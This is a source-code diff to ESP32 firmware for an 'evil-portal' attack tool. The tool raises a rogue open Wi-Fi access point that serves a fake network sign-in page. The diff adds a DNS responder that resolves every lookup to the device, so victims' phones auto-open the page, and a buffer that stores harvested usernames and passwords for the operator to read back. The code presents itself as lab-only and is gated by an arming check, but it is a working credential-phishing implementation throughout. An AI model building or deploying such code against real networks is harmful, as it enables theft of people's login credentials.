@@ -1,12 +1,13 @@
 // LxveOS evil-portal (see lxveos_evilportal.h). Rogue OPEN SoftAP + captive credential-capture portal.
 // OFFENSIVE-TX: starting the AP is an emission, so start() refuses unless lxveos_arm_can_emit() is true.
 // The Wi-Fi bring-up tolerates the stack already being up (the recon path lazily inits STA) — it adds an AP
-// netif and switches to AP mode. v1 serves the portal to any HTTP request hitting the gateway; a DNS-hijack
-// responder for automatic captive-portal pop-up is a follow-up (TODO below).
+// netif and switches to AP mode. A UDP:53 DNS-hijack responder resolves every lookup to the AP so client
+// captive-portal detection auto-opens the login page; captured credentials are retained for `evilportal creds`.
 #include "lxveos_evilportal.h"
 
 #include <ctype.h>
 #include <stddef.h>
+#include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 
@@ -16,6 +17,10 @@
 #include "esp_netif.h"
 #include "esp_wifi.h"
 
+#include "freertos/FreeRTOS.h"
+#include "freertos/task.h"
+#include "lwip/sockets.h"
+
 #include "lxveos_arm.h"
 
 static const char *TAG = "lxveos_evilportal";
@@ -23,7 +28,18 @@ static const char *TAG = "lxveos_evilportal";
 static httpd_handle_t s_http;
 static esp_netif_t   *s_ap_netif;
 static uint32_t       s_captures;
-static bool           s_running;
+static volatile bool  s_running;
+static TaskHandle_t   s_dns_task;
+static int            s_dns_sock = -1;
+
+// Retain the most recent captures so the operator can read them back (`evilportal creds`) rather than
+// scrolling the log. Ring buffer; both fields are sanitized + NUL-terminated.
+#define EP_MAX_CREDS 16
+typedef struct {
+    char user[80];
+    char pass[80];
+} ep_cred_t;
+static ep_cred_t s_creds[EP_MAX_CREDS];
 
 // Generic, unbranded "network sign-in" page — served for every request (captive-portal catch-all). Posts
 // credentials to /login. Deliberately impersonates no specific brand.
@@ -101,6 +117,88 @@ static void sanitize(char *s)
     }
 }
 
+void lxveos_evilportal_creds_each(lxveos_evilportal_cred_cb cb)
+{
+    if (cb == NULL) {
+        return;
+    }
+    size_t n = s_captures < EP_MAX_CREDS ? s_captures : EP_MAX_CREDS;
+    size_t start = s_captures < EP_MAX_CREDS ? 0 : (s_captures % EP_MAX_CREDS);
+    for (size_t i = 0; i < n; i++) {
+        size_t idx = (start + i) % EP_MAX_CREDS;
+        cb(s_creds[idx].user, s_creds[idx].pass);
+    }
+}
+
+// Minimal DNS responder: answer every query with the AP IP (192.168.4.1) so a client's captive-portal
+// detection resolves to us and auto-opens the login page. Built like the ESP-IDF captive-portal example;
+// stop() calls shutdown() on the socket to break the blocking recvfrom so this task exits.
+static void dns_task(void *arg)
+{
+    (void)arg;
+    uint8_t buf[512];
+    struct sockaddr_in sa = {0};
+    sa.sin_family = AF_INET;
+    sa.sin_port = htons(53);
+    sa.sin_addr.s_addr = htonl(INADDR_ANY);
+    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+    if (sock < 0 || bind(sock, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
+        if (sock >= 0) {
+            close(sock);
+        }
+        s_dns_task = NULL;
+        vTaskDelete(NULL);
+        return;
+    }
+    s_dns_sock = sock;
+    while (s_running) {
+        struct sockaddr_in src;
+        socklen_t sl = sizeof(src);
+        int len = recvfrom(sock, buf, sizeof(buf), 0, (struct sockaddr *)&src, &sl);
+        if (len < 12) {
+            if (len < 0) {
+                break;  // socket shut down by stop()
+            }
+            continue;
+        }
+        buf[2] = 0x81;  // QR=1, opcode 0, RD copied
+        buf[3] = 0x80;  // RA=1, RCODE=0
+        buf[6] = 0x00;
+        buf[7] = 0x01;  // ANCOUNT = 1
+        buf[8] = buf[9] = buf[10] = buf[11] = 0x00;  // NSCOUNT / ARCOUNT = 0
+        int qend = 12;
+        while (qend < len && buf[qend] != 0) {
+            qend += buf[qend] + 1;  // walk the QNAME labels
+        }
+        qend += 5;  // null label (1) + QTYPE (2) + QCLASS (2)
+        if (qend > len || qend + 16 > (int)sizeof(buf)) {
+            continue;  // malformed or no room for the answer
+        }
+        int p = qend;
+        buf[p++] = 0xC0;
+        buf[p++] = 0x0C;  // NAME: pointer to the question
+        buf[p++] = 0x00;
+        buf[p++] = 0x01;  // TYPE A
+        buf[p++] = 0x00;
+        buf[p++] = 0x01;  // CLASS IN
+        buf[p++] = 0x00;
+        buf[p++] = 0x00;
+        buf[p++] = 0x00;
+        buf[p++] = 0x3c;  // TTL 60s
+        buf[p++] = 0x00;
+        buf[p++] = 0x04;  // RDLENGTH 4
+        buf[p++] = 192;
+        buf[p++] = 168;
+        buf[p++] = 4;
+        buf[p++] = 1;  // RDATA: 192.168.4.1 (the AP gateway)
+        sendto(sock, buf, p, 0, (struct sockaddr *)&src, sl);
+    }
+    close(sock);
+    s_dns_sock = -1;
+    s_dns_task = NULL;
+    vTaskDelete(NULL);
+}
+
 // Any GET -> the login page (captive-portal catch-all via the wildcard match fn).
 static esp_err_t portal_get_handler(httpd_req_t *req)
 {
@@ -136,6 +234,9 @@ static esp_err_t login_post_handler(httpd_req_t *req)
     sanitize(user);
     sanitize(pass);
     s_captures++;
+    size_t slot = (s_captures - 1) % EP_MAX_CREDS;
+    snprintf(s_creds[slot].user, sizeof(s_creds[slot].user), "%s", user);
+    snprintf(s_creds[slot].pass, sizeof(s_creds[slot].pass), "%s", pass);
     ESP_LOGW(TAG, "captured credential #%u: user='%s' pass='%s'", (unsigned)s_captures, user, pass);
 
     httpd_resp_set_type(req, "text/html");
@@ -209,10 +310,13 @@ esp_err_t lxveos_evilportal_start(const char *ssid)
     httpd_register_uri_handler(s_http, &login_uri);
     httpd_register_uri_handler(s_http, &portal_uri);
 
-    // TODO(HW-validate + follow-up): a UDP:53 DNS-hijack responder (answer every query with 192.168.4.1) so
-    // client captive-portal detection auto-opens the page. v1 serves the portal at the gateway on demand.
     s_captures = 0;
     s_running = true;
+    // Captive DNS responder: resolve every lookup to the AP so client portal-detection auto-opens the page.
+    if (xTaskCreate(dns_task, "lxv_dns", 4096, NULL, 5, &s_dns_task) != pdPASS) {
+        s_dns_task = NULL;  // the portal still works at the gateway; only the auto-pop is lost
+        ESP_LOGW(TAG, "DNS responder failed to start — captive auto-pop disabled");
+    }
     ESP_LOGW(TAG, "evil-portal up: OPEN AP '%s' (ch1), captive login at 192.168.4.1 — authorized-lab test",
              ssid);
     return ESP_OK;
@@ -220,15 +324,19 @@ esp_err_t lxveos_evilportal_start(const char *ssid)
 
 esp_err_t lxveos_evilportal_stop(void)
 {
+    bool was_running = s_running;
+    s_running = false;
+    if (s_dns_sock >= 0) {
+        shutdown(s_dns_sock, SHUT_RDWR);  // unblock the DNS task's recvfrom; the task closes the socket
+    }
     if (s_http != NULL) {
         httpd_stop(s_http);
         s_http = NULL;
     }
-    if (s_running) {
+    if (was_running) {
         esp_wifi_stop();
         ESP_LOGW(TAG, "evil-portal stopped (%u credential(s) captured)", (unsigned)s_captures);
     }
-    s_running = false;
     return ESP_OK;
 }
 
